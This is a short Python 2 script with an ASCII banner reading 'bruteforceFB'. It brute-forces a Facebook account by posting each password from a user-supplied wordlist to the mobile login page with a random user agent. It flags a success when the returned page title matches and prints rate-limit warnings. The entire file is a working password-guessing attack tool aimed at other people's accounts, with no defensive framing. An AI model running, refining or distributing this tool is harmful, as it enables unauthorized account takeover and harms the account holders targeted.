import requests
from random import randint
import sys

r = requests
url = "https://m.facebook.com/login.php"

def printBanner():
    print BOLD + CBEIGE + """
     _                _        __                    _____ ____  
    | |__  _ __ _   _| |_ ___ / _| ___  _ __ ___ ___|  ___| __ ) 
    | '_ \| '__| | | | __/ _ \ |_ / _ \| '__/ __/ _ \ |_  |  _ \ 
    | |_) | |  | |_| | ||  __/  _| (_) | | | (_|  __/  _| | |_) |
    |_.__/|_|   \__,_|\__\___|_|  \___/|_|  \___\___|_|   |____/ 
   
   """

def UARand(file):
    user_agent = open(file,'r').read().split("\n")[:-1]
    random = randint(0, len(user_agent) - 1)
    return user_agent[random]


def CheckAccount(username, password):
    data = {
        'email': username,
        'pass' : password
    }
    header = { 'User-Agent': UARand('user_agents.txt') }
    post = r.post(url, data, header)
    return post.text


def main():
    if( len(sys.argv) > 2):
        username = sys.argv[1]
        wordlist = open(sys.argv[2],'r').read().split('\n')[:-1]
        printBanner()
        print BOLD + CGREEN +"[=]"+ CWHITE +" Check For"+ CYELLOW +" {} ".format(len(wordlist))+ CWHITE +"Possible Passwords.."
        
        for password in wordlist:
            out = CheckAccount(username, password)
            if '<title>Facebook</title>' in out:
                print BOLD + CGREEN + "[+]" + CWHITE +" Success,"+ CGREEN , password+"\n"
                break
            elif 'Too Many Login Attempts' in out:
                print BOLD + CRED + "[!]" + CWHITE +" Too Many Login Attempts"
            else:
                print BOLD + CRED + "[-]" + CWHITE +" Failed,"+CRED, password 


    else:
        printBanner()
        print CWHITE + "Usage: python {} [username] [wordlist]\n\n".format(sys.argv[0])


if __name__ == '__main__':
    BOLD   = '\033[1m'
    CRED    = '\033[31m'
    CGREEN  = '\033[32m'
    CYELLOW = '\033[33m'
    CBLUE   = '\033[34m'
    CBEIGE  = '\033[36m'
    CWHITE  = '\033[37m'
    
    main()



